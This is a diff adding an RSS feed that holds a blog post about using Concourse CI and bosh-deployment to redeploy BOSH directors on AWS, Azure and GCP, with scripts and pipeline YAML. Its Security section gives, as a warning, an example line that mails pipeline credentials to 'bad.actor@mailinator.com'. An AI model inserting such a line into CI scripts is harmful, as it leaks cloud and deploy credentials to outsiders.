@@ -1,0 +1,584 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Bosh on Younjin Jeong&#39;s Blog</title>
+    <link>http://engineering.pivotal.io/categories/bosh/</link>
+    <description>Recent content in Bosh on Younjin Jeong&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 24 Nov 2017 14:06:25 +0000</lastBuildDate>
+    <atom:link href="http://engineering.pivotal.io/categories/bosh/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Maintaining BOSH Directors with Concourse CI and bosh-deployment</title>
+      <link>http://engineering.pivotal.io/post/bosh-deployed-with-concourse/</link>
+      <pubDate>Fri, 24 Nov 2017 14:06:25 +0000</pubDate>
+        
+        
+        <author>
+        
+        </author>
+      <guid>http://engineering.pivotal.io/post/bosh-deployed-with-concourse/</guid>
+      <description>
+
+&lt;p&gt;&lt;em&gt;&amp;ldquo;BOSH deploys Concourse, and Concourse deploys BOSH&amp;rdquo; —Cloud Foundry koan&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;A BOSH Director is a VM (virtual machine) orchestrator which is itself a VM.
+BOSH solves the problem of keeping its VMs&amp;rsquo; applications (operating systems
+(stemcells) and releases) up-to-date with the command, &lt;code&gt;bosh deploy&lt;/code&gt;; however,
+this begs the question, &amp;ldquo;what keeps the BOSH Director itself up-to-date?&amp;rdquo;.
+&lt;sup&gt;&lt;a href=&#34;#quis&#34; class=&#34;alert-link&#34;&gt;[Quis custodiet?]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;p&gt;We explore using &lt;a href=&#34;https://concourse.ci/&#34;&gt;Concourse&lt;/a&gt;, a Continuous Integration
+(CI) server, and
+&lt;a href=&#34;https://github.com/cloudfoundry/bosh-deployment/&#34;&gt;bosh-deployment&lt;/a&gt; &lt;sup&gt;&lt;a
+href=&#34;#bosh_up_to_date&#34; class=&#34;alert-link&#34;&gt;[Updating BOSH]&lt;/a&gt;&lt;/sup&gt;, in order
+to create a &lt;a href=&#34;https://github.com/cloudfoundry/bosh-deployment/&#34;&gt;Concourse
+pipeline&lt;/a&gt; which updates, in
+turn, a BOSH director on AWS (Amazon Web Services), on Microsoft Azure, and GCP
+(Google Cloud Platform). Updating all three BOSH directors can be accomplished
+with a single click. &lt;sup&gt;&lt;a href=&#34;#one_click&#34; class=&#34;alert-link&#34;&gt;[One
+click]&lt;/a&gt;&lt;/sup&gt; Best of all, our directors are re-deployed with a recent
+stemcell, BOSH release, and CPI release.  &lt;sup&gt;&lt;a href=&#34;#how_recent&#34;
+class=&#34;alert-link&#34;&gt;[How recent?]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;0-overview&#34;&gt;0. Overview&lt;/h2&gt;
+
+&lt;p&gt;Our Concourse pipeline is publicly-viewable, and can be seen at
+&lt;a href=&#34;https://ci.nono.io/teams/main/pipelines/BOSH&#34;&gt;https://ci.nono.io/teams/main/pipelines/BOSH&lt;/a&gt;. It&amp;rsquo;s a straightforward pipeline
+which consists of three jobs, one for each director on each IaaS (Infrastructure
+as a Service): bosh-aws.nono.io, bosh-azure.nono.io, and bosh-gce.nono.io.&lt;/p&gt;
+
+
+
+  &lt;figure class=&#34;img-responsive&#34;&gt;
+      
+          &lt;img src=&#34;https://user-images.githubusercontent.com/1020675/31297994-0405c082-aa9d-11e7-9669-b8f08852d286.png&#34;  class=&#34;img-responsive&#34; /&gt;
+      
+      
+  &lt;/figure&gt;
+
+
+
+
+&lt;p&gt;Below is a diagram of our Concourse configuration which describes the pipeline
+in greater detail. Note that we keep our credentials (e.g our AWS access key and
+secret) in LastPass (see items in red), but LastPass is not strictly necessary:
+credentials can be embedded directly in the BOSH manifests, can be passed as
+variables during the BOSH manifest creation, or can be maintained as files on
+the local hard drive.&lt;/p&gt;
+
+
+
+  &lt;figure class=&#34;img-responsive&#34;&gt;
+      
+          &lt;img src=&#34;https://docs.google.com/drawings/d/e/2PACX-1vTXkKXrmPKiLkU2AwIiDWtA5FDun6u8TvGN49SbZ1jlsRScOyQT_B4sInIryzCveyK3-ia1DjSyvFLT/pub?w=1224&amp;amp;h=1584&#34;  class=&#34;img-responsive&#34; /&gt;
+      
+      
+  &lt;/figure&gt;
+
+
+
+
+&lt;h2 id=&#34;1-concourse-tasks&#34;&gt;1. Concourse Tasks&lt;/h2&gt;
+
+&lt;p&gt;To build our Concourse pipeline, we begin with the the smallest configurable
+component, the Concourse &lt;a href=&#34;https://concourse.ci/running-tasks.html&#34;&gt;task&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The Concourse task is often a set of Concourse resources (e.g GitHub
+repositories containing BOSH manifests), environment variables (e.g. &lt;code&gt;${IAAS}&lt;/code&gt;
+(the IaaS to which we&amp;rsquo;re deploying)), and perhaps most importantly, the shell
+script which deploys the director.&lt;/p&gt;
+
+&lt;h3 id=&#34;1-0-concourse-task-shell-script&#34;&gt;1.0 Concourse Task Shell Script&lt;/h3&gt;
+
+&lt;p&gt;Here is our annotated &lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/ci/tasks/bosh.sh&#34;&gt;shell
+script&lt;/a&gt;
+our Concourse tasks use to deploy our BOSH director:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+# We abort the script as soon as we hit an error (as soon as a command exits
+# with a non-zero exit status)
+set -e
+
+# `cunnie-deployments` is the checked-out GitHub repo that contains our BOSH
+# manifests and our directors&#39; `-state.json` files; it also contains this
+# script (task script) and task definition.
+pushd cunnie-deployments
+
+# We invoke the script that generates our BOSH director&#39;s manifest, e.g.
+# `aws.sh`, `azure.sh`. The output, the BOSH director&#39;s manifest, is named
+# `bosh-$IAAS.yml`, e.g. `bosh-aws.yml`
+bin/$IAAS.sh
+
+# Does ${DEPLOYMENTS_YML} have a complete set of interpolated variables?
+# Abort if not (`--var-errs`).
+bosh int bosh-$IAAS.yml \
+  --var-errs \
+  -l &amp;lt;(echo &amp;quot;$DEPLOYMENTS_YML&amp;quot;) \
+  -l &amp;lt;(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml) \
+  &amp;gt; /dev/null
+
+# We attempt to deploy our BOSH director. We prepare a git commit message
+# regardless whether our attempt succeeds or fails because we need to retain any
+# change to the BOSH director&#39;s `-state.json` file. This is necessary in cases
+# where a deploy proceeds far enough to create a broken director VM, for
+# subsequent deploys must be able to destroy the broken director VM in order to
+# free up its IP address so that the current deploy will succeed. The crucial
+# information needed to destroy the  broken director VM is its VM&#39;s ID, which is
+# recorded in the `-state.json` file.
+
+# Note that `set -e` does not trigger an abort if the command that returns a
+# non-zero exit code is the subject of an `if` block, i.e. `if bosh create-env`;
+# this gives us the breathing room to commit our results regardless of whether
+# `bosh create-env` succeeded or failed
+if bosh create-env bosh-$IAAS.yml \
+  -l &amp;lt;(echo &amp;quot;$DEPLOYMENTS_YML&amp;quot;) \
+  -l &amp;lt;(curl https://raw.githubusercontent.com/cunnie/sslip.io/master/conf/sslip.io%2Bnono.io.yml); then
+  GIT_COMMIT_MESSAGE=&amp;quot;CI PASS: $IAAS BOSH deploy :airplane:&amp;quot;
+  DEPLOY_EXIT_STATUS=0
+else
+  GIT_COMMIT_MESSAGE=&amp;quot;CI FAIL: $IAAS BOSH deploy :airplane:&amp;quot;
+  DEPLOY_EXIT_STATUS=1
+fi
+
+# Do we need to commit anything? If a new director hasn&#39;t been deployed (most
+# often because there&#39;s been no change to the manifest, releases, or stemcell),
+# then we don&#39;t need to commit
+if ! git diff --quiet HEAD --; then
+  # If we&#39;re in this block, then there has been a deployment. Let&#39;s set our
+  # git author to avoid git&#39;s `*** Please tell me who you are.` error.
+  git config --global user.name &amp;quot;Concourse CI&amp;quot;
+  git config --global user.email brian.cunnie@gmail.com
+
+  # We check out our branch&#39;s HEAD because Concourse&#39;s git-resource leaves us
+  # in `detached HEAD` state. ${DEPLOYMENTS_BRANCH} is typically set to
+  # `master`, but may be set to something else (usually while testing).
+  git checkout $DEPLOYMENTS_BRANCH
+  git add .
+  git commit -m&amp;quot;$GIT_COMMIT_MESSAGE&amp;quot;
+fi
+popd
+
+# We copy our repo with its new commit to a new directory. The Concourse job,
+# after it finishes running this task, will push the new commit to GitHub.
+# Note that `cp -R` works as well as `rsync`; we use `rsync` by force of
+# habit.
+rsync -aH cunnie-deployments/ cunnie-deployments-with-state/
+
+# We exit with the return code of `bosh create-env`; if the deploy failed, then
+# this Concourse task failed
+exit $DEPLOY_EXIT_STATUS
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;For those interested in the scripts which generate the BOSH director manifests
+(e.g. &lt;code&gt;aws.sh&lt;/code&gt;), they were covered in an earlier &lt;a href=&#34;http://engineering.pivotal.io/post/bosh-ssl/&#34;&gt;blog
+post&lt;/a&gt;. For links to the scripts
+and the manifests they generate,  see the table below:&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;IaaS&lt;/th&gt;
+&lt;th&gt;Script&lt;/th&gt;
+&lt;th&gt;Generated Manifest&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;AWS&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/bin/aws.sh&#34;&gt;aws.sh&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/bosh-aws.yml&#34;&gt;bosh-aws.yml&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;Azure&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/bin/azure.sh&#34;&gt;azure.sh&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/bosh-azure.yml&#34;&gt;bosh-azure.yml&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;GCP&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/bin/gce.sh&#34;&gt;gce.sh&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/bosh-gce.yml&#34;&gt;bosh-gce.yml&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&#34;1-1-concourse-task-configuration-file&#34;&gt;1.1 Concourse Task Configuration file&lt;/h3&gt;
+
+&lt;p&gt;Now that we have our task&amp;rsquo;s shell script, we turn our attention to our task&amp;rsquo;s
+(YAML) configuration file. It can be viewed on &lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/ci/tasks/bosh.yml&#34;&gt;GitHub&lt;/a&gt;,
+and is displayed below, too:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;---
+platform: linux
+
+image_resource:
+  type: docker-image
+  source:
+    repository: cunnie/fedora-golang-bosh
+
+inputs:
+- name: cunnie-deployments
+- name: bosh-deployment
+
+outputs:
+- name: cunnie-deployments-with-state
+
+params:
+  # vainly default branch to master, but it&#39;s always overridden from the pipeline
+  DEPLOYMENTS_BRANCH: &#39;master&#39;
+  DEPLOYMENTS_YML: &#39;&#39;
+  IAAS: &#39;&#39;
+
+run:
+  path: cunnie-deployments/ci/tasks/bosh.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Notes:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;image_resource:&lt;/code&gt; We use a custom-built Docker image,
+&lt;code&gt;cunnie/fedora-golang-bosh&lt;/code&gt;
+(&lt;a href=&#34;https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/&#34;&gt;https://hub.docker.com/r/cunnie/fedora-golang-bosh/~/dockerfile/&lt;/a&gt;); but you
+may choose to  use your own Docker image; just be sure that the &lt;a href=&#34;https://github.com/cloudfoundry/bosh-cli&#34;&gt;BOSH
+CLI&lt;/a&gt; is installed. Our image is fairly
+hefty (450 MB), for it has a rich set of tools available to us when we need to
+&lt;a href=&#34;https://concourse.ci/fly-intercept.html&#34;&gt;intercept&lt;/a&gt; the container to
+troubleshoot a build.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;inputs:&lt;/code&gt; We have two inputs:
+&lt;a href=&#34;https://github.com/cloudfoundry/bosh-deployment&#34;&gt;&lt;code&gt;bosh-deployment&lt;/code&gt;&lt;/a&gt;, a git repo
+which contains the manifests and tools necessary to deploy a BOSH director (this
+is the canonical way to deploy a BOSH director), and
+&lt;a href=&#34;https://github.com/cunnie/deployments/&#34;&gt;&lt;code&gt;cunnie-deployments&lt;/code&gt;&lt;/a&gt;, a git repo which
+contains our BOSH directors&amp;rsquo; manifests and state files. Also, this repo contains
+the required Concourse task definition (&lt;code&gt;ci/tasks/bosh.yml&lt;/code&gt;) and script
+(&lt;code&gt;ci/tasks/bosh.sh&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;outputs:&lt;/code&gt; We have one output, &lt;code&gt;cunnie-deployments-with-state&lt;/code&gt;, which is the
+same as the input, &lt;code&gt;cunnie-deployments&lt;/code&gt;. Concourse prohibits an input from also
+being an output, so our script copies the contents of one to the other.
+&lt;code&gt;cunnie-deployments-with-state&lt;/code&gt; includes the commits made by the task (in the
+case of a deploy, the state file and possibly the BOSH director&amp;rsquo;s manifest).
+This output is used by a subsequent step in the Concourse job which will push
+any git commits to GitHub (although this Concourse &lt;em&gt;task&lt;/em&gt; may make git commits,
+it won&amp;rsquo;t push them — it leaves that responsibility to the Concourse &lt;em&gt;job&lt;/em&gt;).&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;params:&lt;/code&gt; &lt;code&gt;DEPLOYMENTS_BRANCH&lt;/code&gt; is almost always set to &lt;code&gt;master&lt;/code&gt;; it refers to
+the branch in the &lt;code&gt;cunnie-deployments&lt;/code&gt; repo. &lt;code&gt;IAAS&lt;/code&gt; is either &lt;code&gt;aws&lt;/code&gt;, &lt;code&gt;azure&lt;/code&gt;, or
+&lt;code&gt;gce&lt;/code&gt;. &lt;code&gt;DEPLOYMENTS_YML&lt;/code&gt; is YAML-formatted and contains secrets needed to
+deploy; sample contents can be viewed in an earlier &lt;a href=&#34;http://engineering.pivotal.io/post/bosh-ssl/#secrets_file&#34;&gt;blog
+post&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;2-concourse-jobs&#34;&gt;2. Concourse Jobs&lt;/h2&gt;
+
+&lt;p&gt;The Concourse job is straightforward:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;It checks out the &lt;code&gt;cunnie-deployments&lt;/code&gt; and &lt;code&gt;bosh-deployment&lt;/code&gt; git repos&lt;/li&gt;
+&lt;li&gt;It runs the task which deploys the BOSH director to the specified IaaS&lt;/li&gt;
+&lt;li&gt;It pushes changes to the director manifest (&lt;code&gt;bosh-${IAAS}.yml&lt;/code&gt;) and the
+director state (&lt;code&gt;bosh-${IAAS}-state.json&lt;/code&gt;) to the &lt;code&gt;cunnie-deployments&lt;/code&gt; repo
+regardless of whether the deploy succeeded or failed (i.e. the &lt;code&gt;ensure&lt;/code&gt;
+directive)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Here is the Concourse job definition which deploys the BOSH director to the AWS
+IaaS:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;jobs:
+- name: bosh-aws.nono.io
+  plan:
+  - get: cunnie-deployments
+  - get: bosh-deployment
+  - task: deploy
+    file: cunnie-deployments/ci/tasks/bosh.yml
+    params:
+      DEPLOYMENTS_BRANCH: master
+      DEPLOYMENTS_YML: ((deployments_yml))
+      IAAS: aws
+    ensure:
+      put: cunnie-deployments
+      params:
+        repository: cunnie-deployments-with-state/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;3-concourse-pipeline&#34;&gt;3. Concourse Pipeline&lt;/h2&gt;
+
+&lt;p&gt;The full Concourse pipeline (&lt;code&gt;pipeline.yml&lt;/code&gt;) can be seen
+&lt;a href=&#34;https://github.com/cunnie/deployments/blob/86dd7d757aee8ca85c0db167f70fa357d6072430/ci/pipeline.yml&#34;&gt;here&lt;/a&gt;.
+Below is an abbreviated portion which shows the Concourse resources and the first
+job (which deploys the AWS BOSH director):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;# fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=&amp;quot;$(lpass show --note github_deployments_key)&amp;quot; -v deployments_yml=&amp;quot;$(lpass show --note deployments.yml)&amp;quot;
+
+jobs:
+- name: bosh-aws.nono.io
+  plan:
+  - get: cunnie-deployments
+  - get: bosh-deployment
+  - task: deploy
+    file: cunnie-deployments/ci/tasks/bosh.yml
+    params:
+      DEPLOYMENTS_BRANCH: master
+      DEPLOYMENTS_YML: ((deployments_yml))
+      IAAS: aws
+    ensure:
+      put: cunnie-deployments
+      params:
+        repository: cunnie-deployments-with-state/
+# Other jobs redacted for brevity
+resources:
+- name: cunnie-deployments
+  type: git
+  source:
+    uri: git@github.com:cunnie/deployments.git
+    private_key: ((github_deployments_key))
+    branch: master
+- name: bosh-deployment
+  type: git
+  source:
+    uri: https://github.com/cloudfoundry/bosh-deployment.git
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Notes:&lt;/p&gt;
+
+&lt;p&gt;The first line is a convenience comment; it shows the &lt;code&gt;fly&lt;/code&gt; (Concourse CLI)
+command which updates the Concourse server&amp;rsquo;s pipeline after changes have been
+made to the &lt;code&gt;pipeline.yml&lt;/code&gt; file. We cut-and-paste that comment into our shell
+whenever we make a change to &lt;code&gt;pipeline.yml&lt;/code&gt; in order to propagate the changes to
+the pipeline to our Concourse server:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fly -t nono sp -p BOSH -c ~/workspace/deployments/ci/pipeline.yml -v github_deployments_key=&amp;quot;$(lpass show --note github_deployments_key)&amp;quot; -v deployments_yml=&amp;quot;$(lpass show --note deployments.yml)&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We have already discussed &lt;code&gt;deployments_yml&lt;/code&gt; (i.e. the Concourse task environment
+variable/parameter &lt;code&gt;DEPLOYMENTS_YML&lt;/code&gt;), but the other variable,
+&lt;code&gt;github_deployments_key&lt;/code&gt;, warrants discussion. It is a &lt;a href=&#34;https://developer.github.com/v3/guides/managing-deploy-keys/&#34;&gt;GitHub deploy
+key&lt;/a&gt; which allows
+our job to push changes to the &lt;code&gt;cunnie-deployments&lt;/code&gt; repo
+&lt;sup&gt;&lt;a href=&#34;#interpolation&#34; class=&#34;alert-link&#34;&gt;[Interpolation]&lt;/a&gt;&lt;/sup&gt; .&lt;/p&gt;
+
+&lt;p&gt;We&amp;rsquo;d like to discuss how we stop the pipeline when the deploy of a BOSH director
+fails. We use Concourse&amp;rsquo;s &lt;a href=&#34;https://concourse.ci/build-plans.html&#34;&gt;&lt;code&gt;passed&lt;/code&gt;&lt;/a&gt;
+directive. For example, if our deploy of the AWS director fails, we do &lt;em&gt;not&lt;/em&gt;
+want to deploy the Azure director.&lt;/p&gt;
+
+&lt;p&gt;The following shows the &lt;code&gt;diff&lt;/code&gt; between the job to deploy the AWS director and
+the job to deploy Azure director. Pay special attention to the &lt;code&gt;passed&lt;/code&gt; and
+&lt;code&gt;trigger&lt;/code&gt; directives: the deploy of the Azure director is kicked off if and only
+if there has been a successful deploy of the AWS director. This limits the
+damage caused by a flawed configuration: only one director is knocked offline
+(typically the first one, AWS), not all three.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt;-- name: bosh-aws.nono.io
++- name: bosh-azure.nono.io
+   plan:
+   - get: cunnie-deployments
++    passed: [ bosh-aws.nono.io ]
++    trigger: true
+   - get: bosh-deployment
++    passed: [ bosh-aws.nono.io ]
++    trigger: true
+   - task: deploy
+     file: cunnie-deployments/ci/tasks/bosh.yml
+     params:
+       DEPLOYMENTS_BRANCH: master
+       DEPLOYMENTS_YML: ((deployments_yml))
+-      IAAS: aws
++      IAAS: azure
+     ensure:
+       put: cunnie-deployments
+       params:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;4-security&#34;&gt;4. Security&lt;/h2&gt;
+
+&lt;div class=&#34;alert alert-error&#34; role=&#34;alert&#34;&gt;
+
+Restrict your Concourse teams to people you trust, don&#39;t unnecessarily expose
+your pipelines or publish your pipelines&#39; configurations (`.yml` files).
+Similarly, restrict access to your GitHub repo which has your director manifests
+and Concourse scripts.
+
+&lt;/div&gt;
+
+&lt;p&gt;Our credentials are stored in our Concourse pipeline, and they can be easily
+revealed by a trusted user with the following command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fly -t nono get-pipeline -p BOSH
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These credentials include IaaS credentials, which will allow a bad actor to spin
+up multiple VMs to run, say, Bitcoin mining. A co-worker of the author whose
+credentials were compromised had unauthorized AWS charges exceeding $3k.&lt;/p&gt;
+
+&lt;p&gt;It is also important to restrict access to the GitHub repo which contains the
+scripts that are run. Although the repo does not contain credentials, it enables
+the execution of commands which can reveal the credentials. For example, the
+following line of code could be added to the &lt;code&gt;ci/tasks/bosh.sh&lt;/code&gt; script to email
+the credentials to the bad actor:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo ${DEPLOYMENTS_YML} | mail -s &amp;quot;secret credentials&amp;quot; bad.actor@mailinator.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;footnotes&#34;&gt;Footnotes&lt;/h2&gt;
+
+&lt;p&gt;&lt;a name=&#34;quis&#34;&gt;&lt;sup&gt;[Quis custodiet?]&lt;/sup&gt;&lt;/a&gt; &amp;ldquo;Who updates the VM [BOSH
+director] that keeps the other VMs updated?&amp;rdquo; is the question, versions of which
+have been asked as long ago as the days of the Roman poet Juvenal, who famously
+asked, &amp;ldquo;&lt;a href=&#34;https://en.wikipedia.org/wiki/Quis_custodiet_ipsos_custodes%3F&#34;&gt;Quis custodiet ipsos
+custodes?&lt;/a&gt;&amp;rdquo; and
+as recently as this century by comic book writer Alan Moore, who phrased it,
+&amp;ldquo;Who watches the Watchmen?&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&#34;how_recent&#34;&gt;&lt;sup&gt;[How recent?]&lt;/sup&gt;&lt;/a&gt;
+How fresh is &lt;code&gt;bosh-deployment&lt;/code&gt;? Fresh.  &lt;code&gt;bosh-deployment&lt;/code&gt; is a quite
+active git repo, typically updated &lt;a href=&#34;https://github.com/cloudfoundry/bosh-deployment/graphs/commit-activity&#34;&gt;several times or more each
+week&lt;/a&gt;.
+It&amp;rsquo;s the tool that the BOSH team, and many Cloud Foundry teams, use to keep
+their BOSH directors current.&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&#34;bosh_up_to_date&#34;&gt;&lt;sup&gt;[Updating BOSH]&lt;/sup&gt;&lt;/a&gt; In the early days, the
+BOSH micro plugin was the mechanism to update the BOSH director. There were
+several drawbacks to the micro plugin, one of which is that it forced the BOSH
+CLI to have an understanding of the API for various IaaSes, breaking the Cloud
+Layer abstraction model.&lt;/p&gt;
+
+&lt;p&gt;Another drawback of the BOSH micro plugin was that it was brittle, so much so
+that it was a common pattern to deploy a BOSH director whose sole purpose was to
+deploy the &amp;ldquo;real&amp;rdquo; BOSH director. &amp;ldquo;Ha!&amp;rdquo; one might ask, &amp;ldquo;But how did you keep that
+first BOSH director up-to-date?&amp;rdquo; The answer is simple: you didn&amp;rsquo;t. You left that
+first BOSH director running and never touched it except to redeploy the &amp;ldquo;real&amp;rdquo;
+BOSH director. You might spin it down if you weren&amp;rsquo;t using it, but you never
+deleted it or updated it.&lt;/p&gt;
+
+&lt;p&gt;These were serious problems, and to address them the BOSH Core team wrote
+&lt;a href=&#34;https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20&#34;&gt;&lt;code&gt;bosh-init&lt;/code&gt;&lt;/a&gt;,
+a Golang-based executable whose purpose was to deploy BOSH directors. It adhered
+to the Cloud Layer abstraction models (it used the existing CPIs (Cloud Provider
+Interfaces) for the existing IaaSes (&lt;a href=&#34;https://github.com/cloudfoundry-incubator/bosh-vsphere-cpi-release&#34;&gt;VMware
+vSphere&lt;/a&gt;,
+&lt;a href=&#34;https://github.com/cloudfoundry-incubator/bosh-google-cpi-release&#34;&gt;Google Cloud
+Platform&lt;/a&gt;
+(GCP),
+&lt;a href=&#34;https://github.com/cloudfoundry-incubator/bosh-openstack-cpi-release&#34;&gt;OpenStack&lt;/a&gt;,
+&lt;a href=&#34;https://github.com/cloudfoundry-incubator/bosh-azure-cpi-release&#34;&gt;Microsoft
+Azure&lt;/a&gt;, among
+others)).&lt;/p&gt;
+
+&lt;p&gt;By April 30, 2015, &lt;code&gt;bosh-init&lt;/code&gt; was production-ready, and the BOSH documentation
+was &lt;a href=&#34;https://github.com/cloudfoundry/docs-bosh/commit/a159cc4f6633ca26d7c9ce1d4ace961b0d1bad20&#34;&gt;updated&lt;/a&gt;
+to reflect the new world order.&lt;/p&gt;
+
+&lt;p&gt;But all was not perfect in the Garden of Eden, for the introduction of
+&lt;code&gt;bosh-init&lt;/code&gt; split the CLIs: whereas before there was one BOSH CLI, now there
+were two: &lt;code&gt;bosh&lt;/code&gt;, the original Ruby-based CLI for managing a BOSH director&amp;rsquo;s
+deployment, and &lt;code&gt;bosh-init&lt;/code&gt; for deploying a BOSH director itself. In many ways
+this resembled the &lt;a href=&#34;https://en.wikipedia.org/wiki/Western_Schism&#34;&gt;Western
+Schism&lt;/a&gt;, a dark chapter in the
+Roman Catholic church when there were two popes (who had the terrible habit of
+excommunicating each other). The BOSH development team remedied this situation
+by creating a &lt;em&gt;third&lt;/em&gt; CLI, the &lt;a href=&#34;https://bosh.io/docs/cli-v2.html&#34;&gt;Golang-based
+CLI&lt;/a&gt;. In this regard, the BOSH development
+team&amp;rsquo;s approach mirrored the approach attempted by the Catholic cardinals,
+who elected a &lt;em&gt;third&lt;/em&gt; pope. The BOSH team&amp;rsquo;s approach succeeded, but the
+cardinals&amp;rsquo; didn&amp;rsquo;t (they were left with three popes running around
+excommunicating each other).&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&#34;one_click&#34;&gt;&lt;sup&gt;[One click]&lt;/sup&gt;&lt;/a&gt; It&amp;rsquo;s technically possible
+to kick off the builds with &lt;em&gt;zero&lt;/em&gt; clicks — to kick off the build automatically
+if, say, a commit is pushed to the &lt;em&gt;bosh-deployment&lt;/em&gt; repository. The modification
+to the pipeline is trivial:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-diff&#34;&gt; - name: bosh-aws.nono.io
+   plan:
+   - get: cunnie-deployments
+   - get: bosh-deployment
++    trigger: true
+ - task: deploy
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;However, the decision to trigger automatically is not without risks: the BOSH
+director may be in the middle of a delicate task, such as updating a deployment,
+and won&amp;rsquo;t have the opportunity to gracefully bring itself down, for&lt;code&gt;bosh
+create-env&lt;/code&gt; is relentless, brooks no delays, and gives no quarter.&lt;/p&gt;
+
+&lt;p&gt;On a more technical note, &lt;code&gt;bosh create-env&lt;/code&gt;, although it will attempt to contact
+the &lt;a href=&#34;https://github.com/cloudfoundry/bosh-agent&#34;&gt;BOSH agent&lt;/a&gt; on the original
+BOSH director in order to terminate the jobs and shut down the VM, it does not
+run the &lt;a href=&#34;https://bosh.io/docs/drain.html&#34;&gt;drain scripts&lt;/a&gt; (scripts which allow
+the BOSH jobs to clean up and get into a state where they can be safely
+stopped).&lt;/p&gt;
+
+&lt;p&gt;There is discussion within the BOSH development team whether to modify the
+behavior of &lt;code&gt;bosh create-env&lt;/code&gt; to make it run the drain scripts. On the positive
+side, it will allow a more cavalier approach to re-deploying the director, and
+make the behavior of &lt;code&gt;bosh create-env&lt;/code&gt; more closely approximate the behavior of
+a BOSH director. On the downside, the time to deploy a BOSH director may vary
+widely, dependent on the time it takes for the drain scripts to complete.&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&#34;interpolation&#34;&gt;&lt;sup&gt;[Interpolation]&lt;/sup&gt;&lt;/a&gt;
+Our GitHub deploy key resembles the following (not our real key) &lt;sup&gt;&lt;a
+href=&#34;#ECC&#34; class=&#34;alert-link&#34;&gt;[Elliptic-curve]&lt;/a&gt;&lt;/sup&gt; :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;-----BEGIN EC PRIVATE KEY-----
